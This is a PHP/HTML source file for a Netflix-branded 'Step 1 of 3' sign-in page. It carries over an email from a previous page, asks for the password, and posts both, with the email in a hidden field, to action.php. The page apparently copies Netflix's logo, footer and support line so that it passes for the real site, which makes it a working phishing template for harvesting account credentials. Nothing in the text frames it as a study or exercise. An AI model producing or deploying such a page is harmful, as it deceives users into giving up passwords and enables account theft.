<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href=https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="images/Netflix_Symbol_RGB.png">
    <title>Netflix</title>
</head>
<style>
    /* ------------------login page css ----------------------*/

    * {
        margin: 0;
        padding: 0;
        font-family: 'Poopins', sans-serif;
    }

    body {
        background-color: white;
    }

    header {
       
        border-bottom: 1px solid #e6e6e6;
    }

    nav {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 27px 40px;
    }

    nav a {
        color: black;
        text-decoration: none;
        font-size: 20px;
        font-family: Netflix Sans, Helvetica Neue, Segoe UI, Roboto, Ubuntu, sans-serif;
    }

    nav a:hover {
        text-decoration: underline;
    }

    .logo {
        width: 9.25rem;
        height: 2.5rem;
    }

    .regFormContaine{
        margin: 0 auto;
    max-width: 440px;
    text-align: left;
    }

    .content {
       padding-bottom: 95px;
    }

    .stepHeader {
        font-size: 12px;
    }

    .stepHeader-container h1 {
        font-weight: 500;
        font-size: 45px;
    }

    .btn {
        padding: 10px 200px;
    }

    .fgt-pass {
        margin: 10px 0px;
    }

    .fgt-pass a {
        text-decoration: none;
    }
    footer a {
    color: black;
}
footer li{
    margin: 10px 0px;
}
footer li a{
    text-decoration: none;
    color: #737373;
}
.ques{
    padding: 0px 7%;
}
.firstload{
    --layout-container-side-padding: 32px;
    padding: 20px 32px 60px;
    padding: 20px var(--layout-container-side-padding) 60px;
}
@media only screen and (max-width: 531px){
    .btn{
        padding: 10px 183px;
   
    }
}
@media only screen and (max-width: 531px){
    nav{
padding: 10px 15px;
    }
}
@media only screen and (max-width: 531px){
.logo {
    width: 4.25rem;
    height: 1.3rem;
}
}
@media only screen and (max-width: 531px){
nav a {
   font-size: 15px;
}
}
@media only screen and (max-width: 770px){
.row>* {
    width: 33%;
}
}
@media only screen and (max-width: 770px){
footer a {
    font-size: 13px;
}
}

</style>

<body>
<header>
        <nav>
            <img src="images/logo.png" class="logo">
            <div>
                <a href="#">Sign in</a>
            </div>
        </nav>
</header>
    <div class="content">
       <div class="firstload">
   
    <form action="action.php" method="post">
        <div class="regFormContaine">
    <div class="stepHeader">
            <p>STEP 1 OF 3</p>
        </div>
        <div class="stepHeader-container">
            <h1>Welcome back!
                Joining Netflix is easy.</h1>
        </div>
        <div class="contextRow">
            <span>Enter your password and you'll be watching in no time.</span>
        </div>
        <div class="mb-3">
            <?php
            // Retrieve the email from the previous page
            $email = isset($_POST['email']) ? $_POST['email'] : '';

            // Display the email for confirmation
            echo '<p>Email: ' . htmlspecialchars($email) . '</p>';
            ?>

        </div>
        <div class="mb-3">
            <label for="exampleInputPassword1" class="form-label">Password</label>
            <input type="password" class="form-control" name="password" id="exampleInputPassword1">
            <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">
        </div>
        <div class="fgt-pass">
            <a href="#">Forgot your password?</a>
        </div>
        <button type="submit" class="btn btn-danger">NEXT</button>
        </div>
    </form>
    </div>
    </div>
    <footer class="mt-5" style="background-color: #f3f3f3">
        <div class="ques">
            <p style=" color: #737373;">Questions? <a href="#" type="tel" style=" color: #737373;">Call 000-800-100-8343</a></p>
        </div>
        <div class="container">
            <div class="row">
                <div class="col-md-3">

                    <ul class="list-unstyled">
                        <li><a href="#">FAQ</a></li>
                       
                        <li><a href="#">Privacy</a></li>
                        
                    </ul>
                </div>
                <div class="col-md-3">

                    <ul class="list-unstyled">
                        <li><a href="#">Help Centre</a></li>
                       
                        <li><a href="#">Cookie Preferences</a></li>
                       
                    </ul>
                </div>
                <div class="col-md-3">

                    <ul class="list-unstyled">
                        <li><a href="#">Netflix</a></li>
                       
                        <li><a href="#">Corporate Information</a></li>
                        
                    </ul>
                </div>
                <div class="col-md-3">

                    <ul class="list-unstyled">
                       
                        <li><a href="#">Terms of Use</a></li>
                       
                    </ul>
                </div>
                
            </div>
            
            <button type="button" class="btn btn-dark" style="padding: 10px;">English <img src="images/down-icon.png"
                    alt="" style="width: 10px;"></button>
            
        </div>
    </footer>
</body>

</html>